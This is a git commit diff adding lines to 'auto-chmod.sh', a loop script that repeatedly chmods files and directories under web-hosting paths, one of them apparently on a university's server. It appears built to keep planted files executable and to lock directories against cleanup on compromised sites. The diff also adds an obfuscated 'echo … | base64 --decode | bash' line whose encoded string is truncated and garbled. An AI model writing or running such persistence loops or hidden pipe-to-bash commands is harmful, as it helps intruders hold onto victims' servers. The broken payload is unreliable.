29d0f0245dbc81597b70ee427454c7211f5e597c
haxorqt <83970696+haxorqt@users.noreply.github.com>
2025-03-08 17:57:37 +0700

    Update auto-chmod.sh

--- auto-chmod.sh
+++ auto-chmod.sh
@@ -8,3 +8,11 @@ while true; do
 done
 
 while true; do find /home/pariwisata/public_html/bulan/ -type f ! -perm 755 -exec chmod 755 {} \;; sleep 5; done
+
+=================================================================
+VERSI BASE64
+echo "sZWVwIDE7IGRvbmU=" | base64 --decode | bash
+
+================================================================
+VERSI TERMINAL ONLY
+while true; do find /home/unidayan-informatika/htdocs/informatika.unidayan.ac.id/public/build/iqos/ -type d ! -perm 0111 -exec chmod 0111 {} \;; sleep 1; done
